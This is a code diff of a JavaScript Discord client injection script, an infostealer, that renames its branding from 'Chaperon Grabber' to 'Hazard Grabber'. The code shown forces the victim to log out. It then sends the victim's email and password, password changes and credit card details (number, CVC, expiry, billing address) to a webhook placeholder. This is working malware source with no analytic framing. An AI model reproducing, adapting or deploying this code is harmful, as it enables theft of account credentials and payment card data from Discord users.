@@ -5,10 +5,10 @@ const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
 
 function FirstTime() {
-    if (!fs.existsSync(path.join(__dirname, "Chaperon"))) {
+    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
         return !0
     }
-    fs.rmdirSync(path.join(__dirname, "Chaperon"));
+    fs.rmdirSync(path.join(__dirname, "Hazard"));
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
@@ -127,15 +127,15 @@ function Login(email, password, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Chaperon Grabber",
+                username: "Hazard Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/920418236619690017/920420418152718376/All_rights_reserved_logo.svg.png",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
                         "fields": [
                             {
-                                "name": "ℹ️ - **Account Info**",
+                                "name": "**Account Info**",
                                 "value": `Email: ${email} - Password: ${password}`,
                                 "inline": true
                             },
@@ -150,7 +150,7 @@ function Login(email, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Chaperon Grabber By KSCH"
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                         }
                     }
                 ]
@@ -176,21 +176,21 @@ function ChangePassword(oldpassword, newpassword, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Chaperon Grabber",
+                username: "Hazard Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/920418236619690017/920420418152718376/All_rights_reserved_logo.svg.png",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
                         "fields": [
                             {
-                                "name": "🎓 **Password Changed**",
-                                "value": `📧 - Email: ${json.email}\n⬇️ - Old Password: ${oldpassword}\n⬆️ - New Password: ${newpassword}`,
+                                "name": "**Password Changed**",
+                                "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
                                 "inline": true
                             },
                             {
-                                "name": "ℹ️ **Other Info**",
-                                "value": `🔮 - Nitro Type: ${GetNitro(json.premium_type)}\n✨ - Badges: ${GetBadges(json.flags)}`,
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                                 "inline": true
                             },
                             {
@@ -204,7 +204,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Chaperon Grabber By KSCH"
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                         }                 
                     }
                 ]
@@ -229,9 +229,9 @@ function ChangeEmail(newemail, password, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
             var params = {
-                username: "Chaperon Grabber",
+                username: "Hazard Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/920418236619690017/920420418152718376/All_rights_reserved_logo.svg.png",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Chaperon Grabber By KSCH"
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                         }                
                     }
                 ]
@@ -283,21 +283,21 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "Chaperon Grabber",
+                username: "Hazard Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/920418236619690017/920420418152718376/All_rights_reserved_logo.svg.png",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
                         "fields": [
                             {
-                                "name": "💳 **Credit Card Added**",
+                                "name": "**Credit Card Added**",
                                 "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                 "inline": true
                             },
                             {
-                                "name": "ℹ️ **Other Info**",
-                                "value": `🔮 - Nitro Type: ${GetNitro(json.premium_type)}\n✨ - Badges: ${GetBadges(json.flags)}`,
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                                 "inline": true
                             },
                             {
@@ -311,7 +311,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Chaperon Grabber By KSCH"
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                         }
                     }
                 ]
